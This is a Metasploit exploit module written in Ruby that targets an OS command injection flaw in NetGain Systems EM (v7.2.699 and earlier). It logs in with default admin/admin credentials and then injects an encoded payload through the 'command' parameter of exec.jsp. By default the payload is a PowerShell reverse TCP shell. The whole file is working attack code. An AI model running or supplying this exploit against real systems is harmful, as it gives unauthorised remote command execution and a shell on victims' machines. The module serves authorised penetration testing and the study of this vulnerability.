require 'msf/core'
require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient 

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NetGain Systems EM OS Command Injection',
      'Description'    => %q{
          This module exploits a os command injection vulnerability in 
          NetGainSystem EM <= v7.2.699 build 1001. The parameter 'command' does not sanitize user
          input allowing for os commands to be injected. 
      },
      'License'        => 'BSD_LICENSE',
      'Author'         =>
        [
          'Mario Ceballos'
        ],
      'References'     =>
        [
          [ 'URL', 'http://www.netgain-systems.com/free-edition/' ],
        ],
      'Privileged'     => true,
      'Platform' => 'windows',
      'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp',},
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Automatic', { }],
        ],
      'DisclosureDate' => 'Jul 5 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(8081),
        OptString.new('USERNAME', [ false, 'The HTTP username to specify for authentication', "admin" ]),
        OptString.new('PASSWORD', [ false, 'The HTTP password to specify for authentication', "admin" ]),
	OptBool.new('SSL',   [true, 'Use SSL', false])
      ], self.class)
  end

  def exploit
    res = send_request_cgi(
     {
       'uri'   => '/logon.do',
       'method' => 'POST',
       'vars_post' => {
	'username' => datastore['USERNAME'],
	'password' => datastore['PASSWORD'],
        }
     }, 5)

     if res && res.code == 302 && res.get_cookies =~ /JSESSIONID=(\w+);/
	sessionid = $1

        encoded_payload = Rex::Text.uri_encode(payload.encoded)
        pingid = rand_text_numeric(13)
	data =  "command=cmd+%2Fc+ping+%2dn+1%7c#{encoded_payload}&argument=127.0.0.1&"
        data << "sync_output=ping#{pingid}&isWindows=true"

        res = send_request_cgi(
         {
           'uri'   => '/u/jsp/tools/exec.jsp',
           'method' => 'POST',
           'headers' => {'Cookie' => "skipWelcome=true; JSESSIONID=#{sessionid}"},
           'data' => data,
         }, 5)
         handler
      else
        print_error("Login Failed")
     end
  end
end
